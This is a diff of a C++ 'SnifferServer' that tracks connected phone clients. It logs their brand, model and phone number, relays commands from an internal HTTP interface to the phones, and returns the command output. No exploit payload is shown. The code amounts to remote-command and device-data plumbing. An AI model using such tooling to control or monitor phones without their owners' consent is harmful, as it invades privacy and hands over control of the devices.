@@ -7,7 +7,7 @@
  */
 
 #include "SnifferServer.h"
-#include "TimeProc.hpp"
+#include <common/TimeProc.hpp>
 
 #include <sys/syscall.h>
 
@@ -326,7 +326,44 @@ void SnifferServer::OnDisconnect(TcpServer *ts, int fd) {
 
 		mClient2RequestMap.Lock();
 		Client2RequestMap::iterator itr2 = mClient2RequestMap.Erase(fd);
+		if( itr2 != mClient2RequestMap.End() ) {
+			mRequest2ClientMap.Erase(itr2->second);
+
+			Message* smHttp = mClientTcpInsideServer.GetIdleMessageList()->PopFront();
+			if( smHttp != NULL ) {
+				smHttp->fd = itr2->second;
+
+				int code = 200;
+				char reason[16] = {"OK"};
+
+				Json::Value rootSend;
+				Json::FastWriter writer;
+
+				rootSend[COMMON_RET] = 0;
+				string param = writer.write(rootSend);
+
+				snprintf(smHttp->buffer, MAXLEN - 1, "HTTP/1.1 %d %s\r\nContext-Length:%d\r\n\r\n%s",
+						code,
+						reason,
+						(int)param.length(),
+						param.c_str()
+						);
+				smHttp->len = strlen(smHttp->buffer);
+
+				mClientTcpInsideServer.SendMessageByQueue(smHttp);
+			}
+
+		}
 		mClient2RequestMap.Unlock();
+
+	} else if( ts == &mClientTcpInsideServer ) {
+		mClient2RequestMap.Lock();
+		Request2ClientMap::iterator itr2 = mRequest2ClientMap.Erase(fd);
+		if( itr2 != mRequest2ClientMap.End() ) {
+			mClient2RequestMap.Erase(itr2->second);
+		}
+		mClient2RequestMap.Unlock();
+
 	}
 
 	LogManager::GetLogManager()->Log(LOG_STAT, "SnifferServer::OnDisconnect( "
@@ -425,8 +462,12 @@ int SnifferServer::HandleRecvMessage(Message *m, Message *sm) {
 	int ret = -1;
 	string param;
 
+    Json::Reader reader;
+    Json::Value rootRecv;
+
 	Json::FastWriter writer;
 	Json::Value rootSend;
+	rootSend[COMMON_RET] = 0;
 
 	if( m == NULL ) {
 		return ret;
@@ -457,70 +498,70 @@ int SnifferServer::HandleRecvMessage(Message *m, Message *sm) {
 		while( !client->cmdListRecv.Empty() ) {
 			scmd = client->cmdListRecv.PopFront();
 			switch (scmd->header.scmdt) {
-			case SnifferTypeClientInfo: {
-				// 获取手机号和手机型号
-	            Json::Value root;
-	            Json::Reader reader;
-	            reader.parse(scmd->param, root);
+			case SnifferTypeClientInfoResult: {
+				// 获取手机号和手机型号返回
+	            reader.parse(scmd->param, rootRecv);
 
-	            client->brand = root[PHONE_INFO_BRAND].asString();
-	            client->model = root[PHONE_INFO_MODEL].asString();
-	            client->phoneNumber = root[PHONE_INFO_NUMBER].asString();
+	            client->brand = rootRecv[PHONE_INFO_BRAND].asString();
+	            client->model = rootRecv[PHONE_INFO_MODEL].asString();
+	            client->phoneNumber = rootRecv[PHONE_INFO_NUMBER].asString();
 
-	    		LogManager::GetLogManager()->Log(LOG_WARNING,
+	    		LogManager::GetLogManager()->Log(
+	    				LOG_MSG,
 	    				"SnifferServer::HandleRecvMessage( "
 	    				"tid : %d, "
 	    				"m->fd : [%d], "
-	    				"[获取手机号和手机型号], "
-	    				"param : %s "
+	    				"[获取手机号和手机型号返回], "
+	    				"scmd->param : %s "
 	    				")",
 	    				(int)syscall(SYS_gettid),
 	    				m->fd,
-	    				param.c_str()
+	    				scmd->param
 	    				);
 			}break;
 			case ExcuteCommandResult: {
 				// 获取命令返回
-	    		LogManager::GetLogManager()->Log(LOG_WARNING,
+	    		LogManager::GetLogManager()->Log(
+	    				LOG_MSG,
 	    				"SnifferServer::HandleRecvMessage( "
 	    				"tid : %d, "
 	    				"m->fd : [%d], "
 	    				"[获取命令返回], "
-	    				"param : %s "
+	    				"scmd->param : %s "
 	    				")",
 	    				(int)syscall(SYS_gettid),
 	    				m->fd,
-	    				param.c_str()
+	    				scmd->param
 	    				);
 
-				Message* sm = mClientTcpInsideServer.GetIdleMessageList()->PopFront();
-				if( sm != NULL ) {
-					mClient2RequestMap.Lock();
-					Client2RequestMap::iterator itr = mClient2RequestMap.Erase(client->fd);
-					sm->fd = itr->second;
-					mClient2RequestMap.Unlock();
+				mClient2RequestMap.Lock();
+				Client2RequestMap::iterator itr = mClient2RequestMap.Erase(client->fd);
+				if( itr != mClient2RequestMap.End() ) {
+					mRequest2ClientMap.Erase(itr->second);
 
-					int code = 200;
-					char reason[16] = {"OK"};
-					string param;
+					Message* smHttp = mClientTcpInsideServer.GetIdleMessageList()->PopFront();
+					if( smHttp != NULL ) {
+						smHttp->fd = itr->second;
 
-					Json::FastWriter writer;
-					Json::Value rootSend;
-					rootSend["ret"] = 1;
+						int code = 200;
+						char reason[16] = {"OK"};
 
-					param = writer.write(rootSend);
+						rootSend[COMMON_RET] = 1;
+						rootSend[COMMAND_RESULT] = scmd->param;
+						param = writer.write(rootSend);
 
-					snprintf(sm->buffer, MAXLEN - 1, "HTTP/1.1 %d %s\r\nContext-Length:%d\r\n\r\n%s",
-							code,
-							reason,
-							(int)param.length(),
-							param.c_str()
-							);
-					sm->len = strlen(sm->buffer);
+						snprintf(smHttp->buffer, MAXLEN - 1, "HTTP/1.1 %d %s\r\nContext-Length:%d\r\n\r\n%s",
+								code,
+								reason,
+								(int)param.length(),
+								param.c_str()
+								);
+						smHttp->len = strlen(smHttp->buffer);
 
-
-					mClientTcpInsideServer.SendMessageByQueue(sm);
+						mClientTcpInsideServer.SendMessageByQueue(smHttp);
+					}
 				}
+				mClient2RequestMap.Unlock();
 
 			}break;
 			default:break;
@@ -590,7 +631,7 @@ int SnifferServer::HandleInsideRecvMessage(Message *m, Message *sm) {
 
 	Json::FastWriter writer;
 	Json::Value rootSend;
-	rootSend["ret"] = 0;
+	rootSend[COMMON_RET] = 0;
 
 	if( m == NULL ) {
 		return ret;
@@ -604,8 +645,6 @@ int SnifferServer::HandleInsideRecvMessage(Message *m, Message *sm) {
 			ret = dataHttpParser.ParseData(m->buffer, m->len);
 		}
 	}
-
-	Client *client = NULL;
 
 	if( ret == 1 ) {
 		ret = -1;
@@ -645,7 +684,7 @@ int SnifferServer::HandleInsideRecvMessage(Message *m, Message *sm) {
 				if( 1 == GetClientList(clientListNode, m) ) {
 					rootSend[CLIENT_LIST] = clientListNode;
 					ret = 1;
-					rootSend["ret"] = 1;
+					rootSend[COMMON_RET] = 1;
 				}
 
 				param = writer.write(rootSend);
@@ -669,7 +708,7 @@ int SnifferServer::HandleInsideRecvMessage(Message *m, Message *sm) {
 					if( 1 == GetClientInfo(clientNode, pClientId, m) ) {
 						rootSend[CLIENT_INFO] = clientNode;
 						ret = 1;
-						rootSend["ret"] = 1;
+						rootSend[COMMON_RET] = 1;
 					}
 				}
 
@@ -694,7 +733,6 @@ int SnifferServer::HandleInsideRecvMessage(Message *m, Message *sm) {
 					if( 1 == SetClientCmd(pClientId, pCommand, m) ) {
 						// 解析成功, 对客户端发送命令, 不返回
 						ret = 0;
-//						rootSend["ret"] = 1;
 					}
 
 					param = writer.write(rootSend);
@@ -712,7 +750,7 @@ int SnifferServer::HandleInsideRecvMessage(Message *m, Message *sm) {
 						m->fd
 						);
 				if( Reload()) {
-					rootSend["ret"] = 1;
+					rootSend[COMMON_RET] = 1;
 				}
 
 				param = writer.write(rootSend);
@@ -844,6 +882,7 @@ int SnifferServer::SetClientCmd(
 
 			mClient2RequestMap.Lock();
 			mClient2RequestMap.Insert(client->fd, m->fd);
+			mRequest2ClientMap.Insert(m->fd, client->fd);
 			mClient2RequestMap.Unlock();
 
 			sm->fd = client->fd;
